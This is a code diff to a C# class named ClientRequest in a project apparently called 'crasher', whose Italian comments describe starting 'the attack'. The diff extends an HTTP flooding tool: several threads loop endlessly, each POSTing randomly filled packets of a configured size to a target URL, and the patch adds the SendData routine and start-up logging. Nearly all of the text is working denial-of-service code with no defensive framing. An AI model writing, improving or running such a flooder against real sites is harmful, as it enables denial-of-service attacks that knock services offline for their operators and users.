@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Linq;
 using System.Net;
 using System.Net.Http;
@@ -12,14 +13,21 @@ namespace crasher.Attacks
 {
     public static class ClientRequest
     {
-        private static WebClient client = new WebClient();
+        private static WebClient client;
         private static Thread[] threads;
         private static bool stopFlag = false;
+        private static Uri Url;
+        private static bool ThreadsStarted = false;
         /**
          * Metodo che starta l'attacco, tipo di attacco a seconda del flag "threading" in AttackSettings.cs
          * **/
         public static void Start()
         {
+            Console.Clear();
+            Url = new Uri(AttackSettings.Url);
+            client = new WebClient();
+
+            Console.WriteLine("Threading mode: " + AttackSettings.Threading);
             if (AttackSettings.Threading)
             {
                 threads = new Thread[AttackSettings.Threads];
@@ -43,7 +51,11 @@ namespace crasher.Attacks
             {
                 threads[i] = new Thread(StartAttack);
                 threads[i].Start();
+
+                Console.WriteLine("[INFO] Thread n." + i + " started attacking target: " + Url.ToString());
             }
+
+            ThreadsStarted = true;
         }
 
         /**
@@ -53,11 +65,20 @@ namespace crasher.Attacks
         {
             while (true)
             {
-                if (stopFlag)
+                if (ThreadsStarted || !AttackSettings.Threading)
                 {
-                    break;
+                    if (stopFlag)
+                    {
+                        break;
+                    }
+                    Byte[] packet = Helpers.NetHelper.RandomFillPackets(AttackSettings.PacketSize);
+                    SendData(Url,packet);
                 }
-                client.DownloadString(AttackSettings.Url);
+                else if (!ThreadsStarted)
+                {
+                    System.Threading.Thread.Sleep(250);
+                }
+
             }
         }
 
@@ -86,6 +107,43 @@ namespace crasher.Attacks
             foreach (Thread thread in threads) {
                 thread.Abort("Stopped attack by user");
             }
+        }
+
+
+        public static string SendData(Uri url, byte[] data)
+        {
+            // Create a request using a URL that can receive a post.   
+            WebRequest request = WebRequest.Create(url);
+            // Set the Method property of the request to POST.  
+            request.Method = "POST";
+            byte[] byteArray = data;
+            // Set the ContentType property of the WebRequest.  
+            request.ContentType = "application/x-www-form-urlencoded";
+            // Set the ContentLength property of the WebRequest.  
+            request.ContentLength = byteArray.Length;
+            // Get the request stream.  
+            Stream dataStream = request.GetRequestStream();
+            // Write the data to the request stream.  
+            dataStream.Write(byteArray, 0, byteArray.Length);
+            // Close the Stream object.  
+            dataStream.Close();
+            // Get the response.  
+            WebResponse response = request.GetResponse();
+            // Display the status.  
+            Console.WriteLine(((HttpWebResponse)response).StatusDescription);
+            // Get the stream containing content returned by the server.  
+            dataStream = response.GetResponseStream();
+            // Open the stream using a StreamReader for easy access.  
+            StreamReader reader = new StreamReader(dataStream);
+            // Read the content.  
+            string responseFromServer = reader.ReadToEnd();
+
+            reader.Close();
+            dataStream.Close();
+            response.Close();
+
+            // Return response content.  
+            return responseFromServer;
         }
     }
 }
